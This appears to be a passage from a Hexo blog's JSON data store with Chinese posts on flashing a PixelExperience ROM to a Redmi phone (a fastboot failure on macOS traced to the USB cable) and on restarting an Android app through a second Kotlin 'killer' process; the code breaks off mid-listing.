class=\"attr\">inject:</span></span><br><span class=\"line\">  <span class=\"attr\">head:</span></span><br><span class=\"line\">  <span class=\"comment\"># - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">&lt;script&gt;...&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>之所以把JS代码压缩成一行，也是方便这里配置。</p>\n"},{"title":"解决macOS执行fastboot找不到设备的问题","date":"2023-08-11T07:49:01.000Z","cover":"2023/08/11/解决macOS执行fastboot找不到设备的问题/image-20230811154542258.png","_content":"\n### 背景\n\n最近准备给我的备用机Redmi Note 11 5G刷个类原生的三方ROM，MIUI实在是用腻了。搜罗了一番，在XDA上找到了一个基于Pixel Experience开发的ROM：[PixelExperience Plus for Redmi Note 11T/11S 5G/11 5G/POCO M4 Pro 5G (everpal)](https://forum.xda-developers.com/t/rom-13-unofficial-oss-vendor-pixelexperience-plus-for-redmi-note-11t-11s-5g-11-5g-poco-m4-pro-5g-everpal.4562525/)，它的实际开源地址是：[github.com/Xiaomi-MT6833/releases/releases/](https://github.com/Xiaomi-MT6833/releases/releases/)，可以直接在里面下载到最新的ROM刷机包和boot.img文件。\n\n下载好`PixelExperience_Plus_everpal-13.0-20230410-1707-UNOFFICIAL.zip`和`boot.img`之后，开始刷机，其实过程非常简单（参考：[小米手机刷PixelExperience系统操作指南](https://miuiver.com/install-pixelexperience-on-xiaomi/)），保证手机已经先解锁BL，并和电脑连接，然后终端执行命令，忽略指南中刷vendor那一步：\n\n```bash\nadb reboot-bootloader\nfastboot flash boot boot.img\nfastboot reboot-recovery\n```\n\n进入Recovery后，先清除内部储存和缓存，点击Factory reset，再点击Format data/factory reset，点击format data确认格式化。然后点击右上角箭头图标返回主界面，点击Apply update，再点击Apply from ADB，接着电脑输入命令开始推包刷机：\n\n```bash\nadb sideload PixelExperience_Plus_everpal-13.0-20230410-1707-UNOFFICIAL.zip\n```\n\n完事之后，点击Reboot system now即可进入新系统！\n\n### 问题\n\n但是，我用macOS，直接就卡在了fastboot这一步，提示`< waiting for any device >`，可我明明已经用USB线连接好手机和电脑了呀！为什么会找不到设备？我以前在Windows和其他macOS上面刷机都是好的。\n\n大概查阅了一下资料，有说adb驱动问题的，有说没开USB调试的，这些对我来说都不是问题，因为在电脑开机状态下，我是可以使用adb命令操作手机的，说明驱动什么的都没问题。\n\n### 解决\n\n思来想去，我发现我用的Apple官方自带的充电数据线（双头Type-C）来连接手机和电脑，会不会是线的问题？马上换成小米官方自带的数据线（单头Type-C），一头插手机，因为现在Mac电脑全是Type-C口了所以另一头插拓展坞，拓展坞再连电脑。\n\n没想到刚一接完，终端就输出刷入boot成功了：\n\n```bash\n➜ fastboot flash boot boot.img\n< waiting for any device >\nSending 'boot_b' (131072 KB)                       OKAY [  4.519s]\nWriting 'boot_b'                                   OKAY [  0.591s]\nFinished. Total time: 5.130s\n```\n\n原来还真是线材的问题，好气好笑！\n\n搞定此问题之后，接下来按上述步骤无脑执行就OK了。终于可以体验原生Android了，看到Google图标的那一刻还是很激动的。\n\n![image-20230811154542258](image-20230811154542258.png)\n","source":"_posts/2023-08-11-解决macOS执行fastboot找不到设备的问题.md","raw":"---\ntitle: 解决macOS执行fastboot找不到设备的问题\ndate: 2023-08-11 15:49:01\ncover: image-20230811154542258.png \ntags:\n  - Android\n  - AOSP\n  - 鼓捣折腾\n  - 问题不大\n---\n\n### 背景\n\n最近准备给我的备用机Redmi Note 11 5G刷个类原生的三方ROM，MIUI实在是用腻了。搜罗了一番，在XDA上找到了一个基于Pixel Experience开发的ROM：[PixelExperience Plus for Redmi Note 11T/11S 5G/11 5G/POCO M4 Pro 5G (everpal)](https://forum.xda-developers.com/t/rom-13-unofficial-oss-vendor-pixelexperience-plus-for-redmi-note-11t-11s-5g-11-5g-poco-m4-pro-5g-everpal.4562525/)，它的实际开源地址是：[github.com/Xiaomi-MT6833/releases/releases/](https://github.com/Xiaomi-MT6833/releases/releases/)，可以直接在里面下载到最新的ROM刷机包和boot.img文件。\n\n下载好`PixelExperience_Plus_everpal-13.0-20230410-1707-UNOFFICIAL.zip`和`boot.img`之后，开始刷机，其实过程非常简单（参考：[小米手机刷PixelExperience系统操作指南](https://miuiver.com/install-pixelexperience-on-xiaomi/)），保证手机已经先解锁BL，并和电脑连接，然后终端执行命令，忽略指南中刷vendor那一步：\n\n```bash\nadb reboot-bootloader\nfastboot flash boot boot.img\nfastboot reboot-recovery\n```\n\n进入Recovery后，先清除内部储存和缓存，点击Factory reset，再点击Format data/factory reset，点击format data确认格式化。然后点击右上角箭头图标返回主界面，点击Apply update，再点击Apply from ADB，接着电脑输入命令开始推包刷机：\n\n```bash\nadb sideload PixelExperience_Plus_everpal-13.0-20230410-1707-UNOFFICIAL.zip\n```\n\n完事之后，点击Reboot system now即可进入新系统！\n\n### 问题\n\n但是，我用macOS，直接就卡在了fastboot这一步，提示`< waiting for any device >`，可我明明已经用USB线连接好手机和电脑了呀！为什么会找不到设备？我以前在Windows和其他macOS上面刷机都是好的。\n\n大概查阅了一下资料，有说adb驱动问题的，有说没开USB调试的，这些对我来说都不是问题，因为在电脑开机状态下，我是可以使用adb命令操作手机的，说明驱动什么的都没问题。\n\n### 解决\n\n思来想去，我发现我用的Apple官方自带的充电数据线（双头Type-C）来连接手机和电脑，会不会是线的问题？马上换成小米官方自带的数据线（单头Type-C），一头插手机，因为现在Mac电脑全是Type-C口了所以另一头插拓展坞，拓展坞再连电脑。\n\n没想到刚一接完，终端就输出刷入boot成功了：\n\n```bash\n➜ fastboot flash boot boot.img\n< waiting for any device >\nSending 'boot_b' (131072 KB)                       OKAY [  4.519s]\nWriting 'boot_b'                                   OKAY [  0.591s]\nFinished. Total time: 5.130s\n```\n\n原来还真是线材的问题，好气好笑！\n\n搞定此问题之后，接下来按上述步骤无脑执行就OK了。终于可以体验原生Android了，看到Google图标的那一刻还是很激动的。\n\n![image-20230811154542258](image-20230811154542258.png)\n","slug":"解决macOS执行fastboot找不到设备的问题","published":1,"updated":"2024-03-25T07:31:26.044Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cluaufh1q005ithe6f2d170sj","content":"<h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>最近准备给我的备用机Redmi Note 11 5G刷个类原生的三方ROM，MIUI实在是用腻了。搜罗了一番，在XDA上找到了一个基于Pixel Experience开发的ROM：<a href=\"https://forum.xda-developers.com/t/rom-13-unofficial-oss-vendor-pixelexperience-plus-for-redmi-note-11t-11s-5g-11-5g-poco-m4-pro-5g-everpal.4562525/\">PixelExperience Plus for Redmi Note 11T&#x2F;11S 5G&#x2F;11 5G&#x2F;POCO M4 Pro 5G (everpal)</a>，它的实际开源地址是：<a href=\"https://github.com/Xiaomi-MT6833/releases/releases/\">github.com&#x2F;Xiaomi-MT6833&#x2F;releases&#x2F;releases&#x2F;</a>，可以直接在里面下载到最新的ROM刷机包和boot.img文件。</p>\n<p>下载好<code>PixelExperience_Plus_everpal-13.0-20230410-1707-UNOFFICIAL.zip</code>和<code>boot.img</code>之后，开始刷机，其实过程非常简单（参考：<a href=\"https://miuiver.com/install-pixelexperience-on-xiaomi/\">小米手机刷PixelExperience系统操作指南</a>），保证手机已经先解锁BL，并和电脑连接，然后终端执行命令，忽略指南中刷vendor那一步：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb reboot-bootloader</span><br><span class=\"line\">fastboot flash boot boot.img</span><br><span class=\"line\">fastboot reboot-recovery</span><br></pre></td></tr></table></figure>\n\n<p>进入Recovery后，先清除内部储存和缓存，点击Factory reset，再点击Format data&#x2F;factory reset，点击format data确认格式化。然后点击右上角箭头图标返回主界面，点击Apply update，再点击Apply from ADB，接着电脑输入命令开始推包刷机：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb sideload PixelExperience_Plus_everpal-13.0-20230410-1707-UNOFFICIAL.zip</span><br></pre></td></tr></table></figure>\n\n<p>完事之后，点击Reboot system now即可进入新系统！</p>\n<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>但是，我用macOS，直接就卡在了fastboot这一步，提示<code>&lt; waiting for any device &gt;</code>，可我明明已经用USB线连接好手机和电脑了呀！为什么会找不到设备？我以前在Windows和其他macOS上面刷机都是好的。</p>\n<p>大概查阅了一下资料，有说adb驱动问题的，有说没开USB调试的，这些对我来说都不是问题，因为在电脑开机状态下，我是可以使用adb命令操作手机的，说明驱动什么的都没问题。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>思来想去，我发现我用的Apple官方自带的充电数据线（双头Type-C）来连接手机和电脑，会不会是线的问题？马上换成小米官方自带的数据线（单头Type-C），一头插手机，因为现在Mac电脑全是Type-C口了所以另一头插拓展坞，拓展坞再连电脑。</p>\n<p>没想到刚一接完，终端就输出刷入boot成功了：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜ fastboot flash boot boot.img</span><br><span class=\"line\">&lt; waiting <span class=\"keyword\">for</span> any device &gt;</span><br><span class=\"line\">Sending <span class=\"string\">&#x27;boot_b&#x27;</span> (131072 KB)                       OKAY [  4.519s]</span><br><span class=\"line\">Writing <span class=\"string\">&#x27;boot_b&#x27;</span>                                   OKAY [  0.591s]</span><br><span class=\"line\">Finished. Total time: 5.130s</span><br></pre></td></tr></table></figure>\n\n<p>原来还真是线材的问题，好气好笑！</p>\n<p>搞定此问题之后，接下来按上述步骤无脑执行就OK了。终于可以体验原生Android了，看到Google图标的那一刻还是很激动的。</p>\n<p><img src=\"/2023/08/11/%E8%A7%A3%E5%86%B3macOS%E6%89%A7%E8%A1%8Cfastboot%E6%89%BE%E4%B8%8D%E5%88%B0%E8%AE%BE%E5%A4%87%E7%9A%84%E9%97%AE%E9%A2%98/image-20230811154542258.png\" alt=\"image-20230811154542258\"></p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover_type":"img","excerpt":"","more":"<h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>最近准备给我的备用机Redmi Note 11 5G刷个类原生的三方ROM，MIUI实在是用腻了。搜罗了一番，在XDA上找到了一个基于Pixel Experience开发的ROM：<a href=\"https://forum.xda-developers.com/t/rom-13-unofficial-oss-vendor-pixelexperience-plus-for-redmi-note-11t-11s-5g-11-5g-poco-m4-pro-5g-everpal.4562525/\">PixelExperience Plus for Redmi Note 11T&#x2F;11S 5G&#x2F;11 5G&#x2F;POCO M4 Pro 5G (everpal)</a>，它的实际开源地址是：<a href=\"https://github.com/Xiaomi-MT6833/releases/releases/\">github.com&#x2F;Xiaomi-MT6833&#x2F;releases&#x2F;releases&#x2F;</a>，可以直接在里面下载到最新的ROM刷机包和boot.img文件。</p>\n<p>下载好<code>PixelExperience_Plus_everpal-13.0-20230410-1707-UNOFFICIAL.zip</code>和<code>boot.img</code>之后，开始刷机，其实过程非常简单（参考：<a href=\"https://miuiver.com/install-pixelexperience-on-xiaomi/\">小米手机刷PixelExperience系统操作指南</a>），保证手机已经先解锁BL，并和电脑连接，然后终端执行命令，忽略指南中刷vendor那一步：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb reboot-bootloader</span><br><span class=\"line\">fastboot flash boot boot.img</span><br><span class=\"line\">fastboot reboot-recovery</span><br></pre></td></tr></table></figure>\n\n<p>进入Recovery后，先清除内部储存和缓存，点击Factory reset，再点击Format data&#x2F;factory reset，点击format data确认格式化。然后点击右上角箭头图标返回主界面，点击Apply update，再点击Apply from ADB，接着电脑输入命令开始推包刷机：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb sideload PixelExperience_Plus_everpal-13.0-20230410-1707-UNOFFICIAL.zip</span><br></pre></td></tr></table></figure>\n\n<p>完事之后，点击Reboot system now即可进入新系统！</p>\n<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>但是，我用macOS，直接就卡在了fastboot这一步，提示<code>&lt; waiting for any device &gt;</code>，可我明明已经用USB线连接好手机和电脑了呀！为什么会找不到设备？我以前在Windows和其他macOS上面刷机都是好的。</p>\n<p>大概查阅了一下资料，有说adb驱动问题的，有说没开USB调试的，这些对我来说都不是问题，因为在电脑开机状态下，我是可以使用adb命令操作手机的，说明驱动什么的都没问题。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>思来想去，我发现我用的Apple官方自带的充电数据线（双头Type-C）来连接手机和电脑，会不会是线的问题？马上换成小米官方自带的数据线（单头Type-C），一头插手机，因为现在Mac电脑全是Type-C口了所以另一头插拓展坞，拓展坞再连电脑。</p>\n<p>没想到刚一接完，终端就输出刷入boot成功了：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜ fastboot flash boot boot.img</span><br><span class=\"line\">&lt; waiting <span class=\"keyword\">for</span> any device &gt;</span><br><span class=\"line\">Sending <span class=\"string\">&#x27;boot_b&#x27;</span> (131072 KB)                       OKAY [  4.519s]</span><br><span class=\"line\">Writing <span class=\"string\">&#x27;boot_b&#x27;</span>                                   OKAY [  0.591s]</span><br><span class=\"line\">Finished. Total time: 5.130s</span><br></pre></td></tr></table></figure>\n\n<p>原来还真是线材的问题，好气好笑！</p>\n<p>搞定此问题之后，接下来按上述步骤无脑执行就OK了。终于可以体验原生Android了，看到Google图标的那一刻还是很激动的。</p>\n<p><img src=\"/2023/08/11/%E8%A7%A3%E5%86%B3macOS%E6%89%A7%E8%A1%8Cfastboot%E6%89%BE%E4%B8%8D%E5%88%B0%E8%AE%BE%E5%A4%87%E7%9A%84%E9%97%AE%E9%A2%98/image-20230811154542258.png\" alt=\"image-20230811154542258\"></p>\n"},{"title":"双进程交互实现App自动重启","date":"2024-03-26T07:40:19.000Z","_content":"\n### 背景\n\n你可能会好奇，有些手游（比如王者荣耀）是怎么实现资源更新后自动重启的？\n\n这个体验确实不错，因为不需要用户手动点击桌面图标重启App，在一些数据恢复备份的场景中，很实用。比如，从云端拉取SQLite数据库db文件或一些prefs配置文件后，会直接覆盖到本地，但进程不重新启动的话，是不会生效的。\n\n### 思路\n\n基本思路其实很简单，利用Android应用对多进程的天然支持，来实现双进程互拉。\n\n> 有的朋友一看见“双进程”、“互拉”这些词汇就会立马联想到保活，注意本文不是讲保活的哦。\n\n为了方便讲解，我们定义主进程之外的另一个进程为 **进程B**。大致流程分这么几步：\n\n- 在主进程执行完一系列业务逻辑后，欲重启，先拉起进程B\n- 进程B启动后，主进程kill掉自己\n- 接着，进程B拉起主进程，然后再kill掉自己，此时主进程完成自动重启\n\n### 实现\n\n先在Manifest中声明进程B，为了良好的交互体验，需要实现一个Activity，进程名称自定义，比如此处叫“killer”，是不是很贴切？\n\n```xml\n        <activity\n            android:name=\".KillerActivity\"\n            android:exported=\"false\"\n            android:launchMode=\"singleTask\"\n            android:process=\":killer\" />\n```\n\n关键实现来了：\n\n```kotlin\nclass KillerActivity : FragmentActivity() {\n\n    companion object {\n        private const val EXTRA_MAIN_PID = \"extra_main_pid\"\n\n        // 当主进程需要重启时，就直接调用此方法启动KillerActivity\n        fun launch(activity: FragmentActivity) {\n            activity.startActivity(\n                Intent(activity, KillerActivity::class.java).apply {\n                    putExtra(EXTRA_MAIN_PID, Process.myPid())\n                }\n            )\n            activity.finish() // 主进程的Activity先关闭\n            GlobalScope.launch {\n                // 稍作延迟后，主进程kill掉自己\n                delay(500L)\n                killProcess()\n            }\n        }\n\n        fun killProcess(pid: Int = Process.myPid()) {\n            Process.killProcess(pid)\n            exitProcess(0)\n        }\n\n        fun isMainProcessAlive(context: Context): Boolean = runCatching {\n            (context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager)\n                .runningAppProcesses.find { it.processName == context.packageName } != null\n        }.getOrDefault(false)\n    }\n\n    override fun onCreate(savedInstanceState: Bundle?) {\n        super.onCreate(savedInstanceState)\n        lifecycleScope.launch {\n            // 此处可以插入一些Loading的UI显示，比如ProgressDialog之类的\n            // ...\n            \n            // 二次检查，防止主进程没杀掉\n            doubleCheckMainProcess()\n            // 稍作等待后，再次启动主进程的Activity\n            startActivity(Intent(this, MainActivity::class.java).apply {\n                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK)\n            })\n            \n            // 进程B的KillerActivity先关闭，再kill掉自己\n            finish()\n            killProcess()\n        }\n    }\n\n    private suspend fun doubleCheckMainProcess() {\n        delay(1500L)\n        if (isMainProcessAlive(this)) {\n            val mainPid = intent.getIntExtra(EXTRA_MAIN_PID, 0)\n            if (mainPid != 0) {\n                killProcess(mainPid)\n                delay(1500L)\n            }\n        }\n    }\n}\n```\n\n整个代码非常简单，只要搞清楚 `killProcess` 方法哪些时候是kill的哪个进程，就理解了。在任意一个需要重启当前进程（可以不只是主进程）的地方，调用：\n\n```kotlin\nKillerActivity.launch(this)\n```\n\n即可。\n","source":"_posts/2024-03-25-双进程交互实现App自动重启.md","raw":"---\ntitle: 双进程交互实现App自动重启\ndate: 2024-03-26 15:40:19\ntags:\n  - Android\n  - Kotlin\n---\n\n### 背景\n\n你可能会好奇，有些手游（比如王者荣耀）是怎么实现资源更新后自动重启的？\n\n这个体验确实不错，因为不需要用户手动点击桌面图标重启App，在一些数据恢复备份的场景中，很实用。比如，从云端拉取SQLite数据库db文件或一些prefs配置文件后，会直接覆盖到本地，但进程不重新启动的话，是不会生效的。\n\n### 思路\n\n基本思路其实很简单，利用Android应用对多进程的天然支持，来实现双进程互拉。\n\n> 有的朋友一看见“双进程”、“互拉”这些词汇就会立马联想到保活，注意本文不是讲保活的哦。\n\n为了方便讲解，我们定义主进程之外的另一个进程为 **进程B**。大致流程分这么几步：\n\n- 在主进程执行完一系列业务逻辑后，欲重启，先拉起进程B\n- 进程B启动后，主进程kill掉自己\n- 接着，进程B拉起主进程，然后再kill掉自己，此时主进程完成自动重启\n\n### 实现\n\n先在Manifest中声明进程B，为了良好的交互体验，需要实现一个Activity，进程名称自定义，比如此处叫“killer”，是不是很贴切？\n\n```xml\n        <activity\n            android:name=\".KillerActivity\"\n            android:exported=\"false\"\n            android:launchMode=\"singleTask\"\n            android:process=\":killer\" />\n```\n\n关键实现来了：\n\n```kotlin\nclass KillerActivity : FragmentActivity() {\n\n    companion object {\n        private const val EXTRA_MAIN_PID = \"extra_main_pid\"\n\n        // 当主进程需要重启时，就直接调用此方法启动KillerActivity\n        fun launch(activity: FragmentActivity) {\n            activity.startActivity(\n                Intent(activity, KillerActivity::class.java).apply {\n                    putExtra(EXTRA_MAIN_PID, Process.myPid())\n                }\n            )\n            activity.finish() // 主进程的Activity先关闭\n            GlobalScope.launch {\n                // 稍作延迟后，主进程kill掉自己\n                delay(500L)\n                killProcess()\n            }\n        }\n\n        fun killProcess(pid: Int = Process.myPid()) {\n            Process.killProcess(pid)\n            exitProcess(0)\n        }\n\n        fun isMainProcessAlive(context: Context): Boolean = runCatching {\n            (context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager)\n                .runningAppProcesses.find { it.processName == context.packageName } != null\n        }.getOrDefault(false)\n    }\n\n    override fun onCreate(savedInstanceState: Bundle?) {\n        super.onCreate(savedInstanceState)\n        lifecycleScope.launch {\n            // 此处可以插入一些Loading的UI显示，比如ProgressDialog之类的\n            // ...\n            \n            // 二次检查，防止主进程没杀掉\n            doubleCheckMainProcess()\n            // 稍作等待后，再次启动主进程的Activity\n            startActivity(Intent(this, MainActivity::class.java).apply {\n                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK)\n            })\n            \n            // 进程B的KillerActivity先关闭，再kill掉自己\n            finish()\n            killProcess()\n        }\n    }\n\n    private suspend fun doubleCheckMainProcess() {\n        delay(1500L)\n        if (isMainProcessAlive(this)) {\n            val mainPid = intent.getIntExtra(EXTRA_MAIN_PID, 0)\n            if (mainPid != 0) {\n                killProcess(mainPid)\n                delay(1500L)\n            }\n        }\n    }\n}\n```\n\n整个代码非常简单，只要搞清楚 `killProcess` 方法哪些时候是kill的哪个进程，就理解了。在任意一个需要重启当前进程（可以不只是主进程）的地方，调用：\n\n```kotlin\nKillerActivity.launch(this)\n```\n\n即可。\n","slug":"双进程交互实现App自动重启","published":1,"updated":"2024-03-25T08:16:35.392Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cluaufh1q005kthe64mbyc4rr","content":"<h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>你可能会好奇，有些手游（比如王者荣耀）是怎么实现资源更新后自动重启的？</p>\n<p>这个体验确实不错，因为不需要用户手动点击桌面图标重启App，在一些数据恢复备份的场景中，很实用。比如，从云端拉取SQLite数据库db文件或一些prefs配置文件后，会直接覆盖到本地，但进程不重新启动的话，是不会生效的。</p>\n<h3 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h3><p>基本思路其实很简单，利用Android应用对多进程的天然支持，来实现双进程互拉。</p>\n<blockquote>\n<p>有的朋友一看见“双进程”、“互拉”这些词汇就会立马联想到保活，注意本文不是讲保活的哦。</p>\n</blockquote>\n<p>为了方便讲解，我们定义主进程之外的另一个进程为 <strong>进程B</strong>。大致流程分这么几步：</p>\n<ul>\n<li>在主进程执行完一系列业务逻辑后，欲重启，先拉起进程B</li>\n<li>进程B启动后，主进程kill掉自己</li>\n<li>接着，进程B拉起主进程，然后再kill掉自己，此时主进程完成自动重启</li>\n</ul>\n<h3 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h3><p>先在Manifest中声明进程B，为了良好的交互体验，需要实现一个Activity，进程名称自定义，比如此处叫“killer”，是不是很贴切？</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">activity</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.KillerActivity&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:exported</span>=<span class=\"string\">&quot;false&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:launchMode</span>=<span class=\"string\">&quot;singleTask&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:process</span>=<span class=\"string\">&quot;:killer&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>关键实现来了：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">KillerActivity</span> : <span class=\"type\">FragmentActivity</span>() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">companion</span> <span class=\"keyword\">object</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"keyword\">const</span> <span class=\"keyword\">val</span> EXTRA_MAIN_PID = <span class=\"string\">&quot;extra_main_pid&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 当主进程需要重启时，就直接调用此方法启动KillerActivity</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">launch</span><span class=\"params\">(activity: <span class=\"type\">FragmentActivity</span>)</span></span> &#123;</span><br><span class=\"line\">            activity.startActivity(</span><br><span class=\"line\">                Intent(activity, KillerActivity::<span class=\"keyword\">class</span>.java).apply &#123;</span><br><span class=\"line\">                    putExtra(EXTRA_MAIN_PID, Process.myPid())</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            )</span><br><span class=\"line\">            activity.finish() <span class=\"comment\">// 主进程的Activity先关闭</span></span><br><span class=\"line\">            GlobalScope.launch &#123;</span><br><span class=\"line\">                <span class=\"comment\">// 稍作延迟后，主进程kill掉自己</span></span><br><span class=\"line\">                delay(<span class=\"number\">500L</span>)</span><br><span class=\"line\">                killProcess()</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">killProcess</span><span class=\"params\">(pid: <span class=\"type\">Int</span> = Process.myPid()</span></span>) &#123;</span><br><span class=\"line\">            Process.killProcess(pid)</span><br><span class=\"line\">            exitProcess(<span class=\"number\">0</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">isMainProcessAlive</span><span class=\"params\">(context: <span class=\"type\">Context</span>)</span></span>: <span class=\"built_in\">Boolean</span> = runCatching &#123;</span><br><span class=\"line\">            (context.getSystemService(Context.ACTIVITY_SERVICE) <span class=\"keyword\">as</span> ActivityManager)</span><br><span class=\"line\">                .runningAppProcesses.find &#123; it.processName == context.packageName &#125; != <span class=\"literal\">null</span></span><br><span class=\"line\">        &#125;.getOrDefault(<span class=\"literal\">false</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">override</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">onCreate</span><span class=\"params\">(savedInstanceState: <span class=\"type\">Bundle</span>?)</span></span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>.onCreate(savedInstanceState)</span><br><span class=\"line\">        lifecycleScope.launch &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 此处可以插入一些Loading的UI显示，比如ProgressDialog之类的</span></span><br><span class=\"line\">            <span class=\"comment\">// ...</span></span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\">// 二次检查，防止主进程没杀掉</span></span><br><span class=\"line\">            doubleCheckMainProcess()</span><br><span class=\"line\">            <span class=\"comment\">// 稍作等待后，再次启动主进程的Activity</span></span><br><span class=\"line\">            startActivity(Intent(<span class=\"keyword\">this</span>, MainActivity::<span class=\"keyword\">class</span>.java).apply &#123;</span><br><span class=\"line\">                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK)</span><br><span class=\"line\">            &#125;)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\">// 进程B的KillerActivity先关闭，再kill掉自己</span></span><br><span 